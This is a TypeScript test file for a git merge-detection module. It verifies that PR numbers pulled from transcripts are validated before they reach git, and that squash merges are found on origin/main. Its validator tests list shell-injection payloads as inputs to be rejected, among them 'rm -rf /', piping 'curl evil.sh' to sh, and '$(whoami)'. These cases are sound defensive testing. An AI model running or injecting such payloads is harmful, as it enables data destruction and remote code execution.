/*
 * merge-check.test.ts — squash-aware merge detection over a REAL git repo.
 *
 * CONTRACT §11 requires a real minimal git repo here, not a mocked `git log`:
 * the whole point of §5.3 is that the squash commit's MESSAGE is the only
 * evidence of a merge, and a mock would happily agree with a wrong query.
 * The fixture creates a real `refs/remotes/origin/main` so the DEFAULT ref
 * path (`origin/main`, not local `main`) is what is actually exercised.
 *
 * The injection cases are the reason this module exists — two external reviews
 * flagged a transcript-derived PR number reaching a shell.
 *
 * @covers FR-01.66
 */

import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  _clearMergeCache,
  checkSquashMerged,
  extractPrMarker,
  validatePrNumber,
} from "./merge-check.js";

let gitAvailable = true;
try {
  execFileSync("git", ["--version"], { stdio: "ignore" });
} catch {
  gitAvailable = false;
}

function git(repo: string, args: string[]): string {
  return execFileSync("git", args, { cwd: repo, encoding: "utf-8", stdio: ["ignore", "pipe", "ignore"] });
}

/** A real repo whose origin/main carries a squash commit for PR #4242. */
function makeRepoWithSquash(prNumber: number | null): string {
  const repo = mkdtempSync(join(tmpdir(), "mc-merge-"));
  git(repo, ["init", "-q", "-b", "main"]);
  git(repo, ["config", "user.email", "t@example.com"]);
  git(repo, ["config", "user.name", "Test"]);
  writeFileSync(join(repo, "a.txt"), "one");
  git(repo, ["add", "."]);
  git(repo, ["commit", "-q", "-m", "chore: initial commit"]);
  if (prNumber != null) {
    writeFileSync(join(repo, "a.txt"), "two");
    git(repo, ["add", "."]);
    git(repo, ["commit", "-q", "-m", `feat(mission): resolver core artifacts (#${prNumber})`]);
  }
  // The squash lands on origin/main — local main may lag in real life, which is
  // exactly why §5.3 checks the remote-tracking ref.
  git(repo, ["update-ref", "refs/remotes/origin/main", "HEAD"]);
  return repo;
}

describe("validatePrNumber (the bounded-int gate)", () => {
  it("accepts a plain digit run", () => {
    expect(validatePrNumber("290")).toBe(290);
    expect(validatePrNumber(290)).toBe(290);
  });

  it("REJECTS every shell-metacharacter and non-numeric payload", () => {
    for (const bad of [
      "290; rm -rf /",
      "290 && curl evil.sh | sh",
      "$(whoami)",
      "`id`",
      "290|tee",
      "--output=/etc/passwd",
      "-1",
      "+290",
      " 290",
      "290\n",
      "0x12",
      "1e3",
      "",
      "abc",
      null,
      undefined,
      {},
      [290],
    ]) {
      expect(validatePrNumber(bad), `${JSON.stringify(bad)} must not validate`).toBeNull();
    }
  });

  it("rejects 0 and an implausibly large number (bounded, not just shaped)", () => {
    expect(validatePrNumber("0")).toBeNull();
    expect(validatePrNumber("99999999999")).toBeNull();
  });
});

const WEBUI = { owner: "svenroth-ai", repo: "shipwright-webui" };

describe("extractPrMarker", () => {
  it("finds the PR number from a github pull url in the transcript", () => {
    const m = extractPrMarker(
      '{"text":"opened https://github.com/svenroth-ai/shipwright-webui/pull/290 ok"}',
      WEBUI,
    );
    expect(m).toEqual({
      number: 290,
      url: "https://github.com/svenroth-ai/shipwright-webui/pull/290",
      owner: "svenroth-ai",
      repo: "shipwright-webui",
    });
  });

  it("keeps the LAST marker when a session opened several PRs of THIS repo", () => {
    const t = [
      "https://github.com/o/r/pull/1",
      "https://github.com/o/r/pull/2",
    ].join(" ... ");
    expect(extractPrMarker(t, { owner: "o", repo: "r" })?.number).toBe(2);
  });

  it("ignores a bare #123 in prose (not a delivery marker)", () => {
    expect(extractPrMarker("fixes #123 as discussed", WEBUI)).toBeNull();
  });

  it("ignores a lookalike host (no marker from evil.com)", () => {
    expect(extractPrMarker("https://github.com.evil.com/o/r/pull/9", WEBUI)).toBeNull();
  });

  it("returns null for an empty transcript", () => {
    expect(extractPrMarker("", WEBUI)).toBeNull();
  });
});

describe.runIf(gitAvailable)("checkSquashMerged (real repo)", () => {
  let repo: string | null = null;

  beforeEach(() => {
    _clearMergeCache();
  });

  afterEach(() => {
    if (repo) rmSync(repo, { recursive: true, force: true });
    repo = null;
  });

  it("detects the squash commit by its (#NNN) message on origin/main", () => {
    repo = makeRepoWithSquash(4242);
    expect(checkSquashMerged(repo, 4242)).toBe("merged");
  });

  it("reports `pending` when no squash commit carries that PR number", () => {
    repo = makeRepoWithSquash(4242);
    expect(checkSquashMerged(repo, 999)).toBe("pending");
  });

  it("is SQUASH-aware: the branch SHA is not an ancestor, yet the merge is found", () => {
    repo = makeRepoWithSquash(4242);
    // Build a side branch whose commits are genuinely NOT on origin/main —
    // `--is-ancestor` would say "not merged" here; the (#NNN) grep says merged.
    git(repo, ["checkout", "-q", "-b", "iterate/x"]);
    writeFileSync(join(repo, "b.txt"), "side");
    git(repo, ["add", "."]);
    git(repo, ["commit", "-q", "-m", "wip: side work"]);
    const sideSha = git(repo, ["rev-parse", "HEAD"]).trim();
    let isAncestor = true;
    try {
      git(repo, ["merge-base", "--is-ancestor", sideSha, "refs/remotes/origin/main"]);
    } catch {
      isAncestor = false;
    }
    expect(isAncestor).toBe(false); // the wrong check would fail here
    expect(checkSquashMerged(repo, 4242)).toBe("merged"); // the right one holds
  });

  it("returns `unknown` (not pending) when origin/main does not exist", () => {
    repo = mkdtempSync(join(tmpdir(), "mc-merge-bare-"));
    git(repo, ["init", "-q", "-b", "main"]);
    git(repo, ["config", "user.email", "t@example.com"]);
    git(repo, ["config", "user.name", "Test"]);
    writeFileSync(join(repo, "a.txt"), "one");
    git(repo, ["add", "."]);
    git(repo, ["commit", "-q", "-m", "chore: init"]);
    expect(checkSquashMerged(repo, 1)).toBe("unknown");
  });

  it("returns `unknown` for an unvalidatable PR number without invoking git", () => {
    repo = makeRepoWithSquash(4242);
    let called = false;
    const state = checkSquashMerged(repo, "4242; rm -rf /", {
      git: () => {
        called = true;
        return "";
      },
    });
    expect(state).toBe("unknown");
    expect(called).toBe(false); // the gate short-circuits BEFORE git
  });

  it("passes the PR number as a separate argv member, never a command string", () => {
    repo = makeRepoWithSquash(4242);
    let seen: string[] = [];
    checkSquashMerged(repo, 4242, {
      git: (args) => {
        seen = args;
        return "";
      },
    });
    expect(seen).toContain("--fixed-strings");
    expect(seen).toContain("--grep=(#4242)");
    expect(seen).toContain("origin/main");
    // No argv member is a shell line.
    for (const a of seen) expect(a).not.toMatch(/[;&|`$]/);
  });
});

describe("merge cache asymmetry", () => {
  beforeEach(() => _clearMergeCache());

  it("caches `merged` indefinitely (a merge is terminal)", () => {
    let calls = 0;
    // The stub returns SUBJECT lines (`--format=%s`), matching the real query.
    const git = () => {
      calls++;
      return "feat: a thing (#7)\n";
    };
    let clock = 1000;
    const now = () => clock;
    expect(checkSquashMerged("/p", 7, { git, now })).toBe("merged");
    clock += 10 * 60 * 60 * 1000; // 10 hours later
    expect(checkSquashMerged("/p", 7, { git, now })).toBe("merged");
    expect(calls).toBe(1);
  });

  it("RE-CHECKS `pending` after the TTL (never cache pending forever)", () => {
    let calls = 0;
    let out = "";
    const git = () => {
      calls++;
      return out;
    };
    let clock = 1000;
    const now = () => clock;
    expect(checkSquashMerged("/p", 8, { git, now, pendingTtlMs: 60_000 })).toBe("pending");
    clock += 30_000;
    expect(checkSquashMerged("/p", 8, { git, now, pendingTtlMs: 60_000 })).toBe("pending");
    expect(calls).toBe(1); // still inside the TTL
    clock += 40_000;
    out = "fix: later squash (#8)\n"; // the PR got merged in the meantime
    expect(checkSquashMerged("/p", 8, { git, now, pendingTtlMs: 60_000 })).toBe("merged");
    expect(calls).toBe(2);
  });
});

/*
 * External plan review (gemini, 2026-07-18) — `--grep` matches ANYWHERE in the
 * commit message, so an unrelated squash that merely MENTIONS a PR number
 * would report a false "merged". The subject-suffix check is the fix.
 */
describe.runIf(gitAvailable)("merge false-positive guard", () => {
  let repo: string | null = null;

  beforeEach(() => _clearMergeCache());
  afterEach(() => {
    if (repo) rmSync(repo, { recursive: true, force: true });
    repo = null;
  });

  it("does NOT report merged when another PR's squash merely mentions the number", () => {
    repo = mkdtempSync(join(tmpdir(), "mc-merge-fp-"));
    git(repo, ["init", "-q", "-b", "main"]);
    git(repo, ["config", "user.email", "t@example.com"]);
    git(repo, ["config", "user.name", "Test"]);
    writeFileSync(join(repo, "a.txt"), "one");
    git(repo, ["add", "."]);
    // PR #500 is only REFERENCED here; the commit actually delivers #501.
    git(repo, ["commit", "-q", "-m", "fix: follow-up to (#500) after review (#501)"]);
    git(repo, ["update-ref", "refs/remotes/origin/main", "HEAD"]);

    expect(checkSquashMerged(repo, 501)).toBe("merged"); // the real delivery
    _clearMergeCache();
    expect(checkSquashMerged(repo, 500)).toBe("pending"); // the mere mention
  });

  it("matches a multi-line body without being fooled by a body mention", () => {
    repo = mkdtempSync(join(tmpdir(), "mc-merge-body-"));
    git(repo, ["init", "-q", "-b", "main"]);
    git(repo, ["config", "user.email", "t@example.com"]);
    git(repo, ["config", "user.name", "Test"]);
    writeFileSync(join(repo, "a.txt"), "one");
    git(repo, ["add", "."]);
    git(repo, ["commit", "-q", "-m", "feat: thing (#777)\n\nSupersedes (#776).\n"]);
    git(repo, ["update-ref", "refs/remotes/origin/main", "HEAD"]);

    expect(checkSquashMerged(repo, 777)).toBe("merged");
    _clearMergeCache();
    expect(checkSquashMerged(repo, 776)).toBe("pending");
  });
});
